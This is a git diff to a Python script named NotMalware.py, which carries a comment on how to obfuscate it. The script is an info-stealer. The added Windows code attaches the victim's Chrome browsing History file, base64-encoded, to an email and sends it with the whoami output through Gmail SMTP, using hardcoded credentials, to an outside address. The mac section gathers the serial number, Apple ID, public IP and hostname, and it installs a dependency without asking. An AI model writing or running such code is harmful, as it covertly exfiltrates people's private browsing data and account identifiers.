@@ -1,3 +1,4 @@
+from email import encoders
 import platform
 import subprocess
 import smtplib
@@ -8,8 +9,16 @@ import os
 import socket
 import getpass
 from email.message import EmailMessage
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+from shutil import copyfile
+
+
 
 ##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
+print('hi')
 def main(platform):
     def windows():
         p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
@@ -56,29 +65,52 @@ def main(platform):
         #print (output)
         #print (f'{p_status} {p_status}')
 #--------------------------------------------------------------------------------------------
+        # = subprocess.Popen('copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "C:\\Users\\User\\Dropbox\\TUFMV0FS\\TestingArea"', stdout=subprocess.PIPE, shell=True)
 
-        try:
-            os.chdir(f"%APPDATA%\\Local\\Google\\Chrome\\User Data\\Default")
-            print('e')
-        except:
-            pass
-               
+        #(copydata, err) = p.communicate()
 
-        msg = EmailMessage()
-        msg.set_content(message)
+        #p_status = p.wait()
+        #print(copydata)
+#-----------------------------------------------------------------------------------------------------
+
+        msg = MIMEMultipart()
 
         msg['Subject'] = info
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
+        body = message
+        msg.attach(MIMEText(body, 'plain'))
+        
+        filename = "History"
+        attachment = open("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb")
+        
+        # instance of MIMEBase and named as p 
+        p = MIMEBase('application', 'octet-stream') 
+        
+        # To change the payload into encoded form 
+        p.set_payload((attachment).read()) 
+        
+        # encode into base64 
+        encoders.encode_base64(p) 
+        
+        p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
+        
+        # attach the instance 'p' to instance 'msg' 
+        msg.attach(p) 
+        # Add attachment to message and convert message to string
+        msg.attach(p)
+        # Add HTML/plain-text parts to MIMEMultipart message
+        # The email client will try to render the last part first
 
         # Send the message via our own SMTP server.
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
         server.send_message(msg)
         server.quit()
-
+        #dir *Program.py /s
         #C: \Users\User\AppData\Local\Google\Chrome\User Data\Default
-#win part end
+        #cd %APPDATA%\Local\Google\Chrome\User Data\Default
+#win part end//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     def mac():
         cmd = "system_profiler SPHardwareDataType | grep 'Serial Number' | awk '{print $4}'" ##Cmd to get priv IP   
@@ -87,6 +119,7 @@ def main(platform):
         cmd = '/usr/libexec/PlistBuddy -c "print :Accounts:0:AccountID" ~/Library/Preferences/MobileMeAccounts.plist' ##Cmd to get AppleID
         result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)    ##Get AppleID from Terminal cmd
         appleID = result.stdout.strip()    
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
         from requests import get
         publicIP = get('https://api.ipify.org').text
         hostname = socket.gethostname()
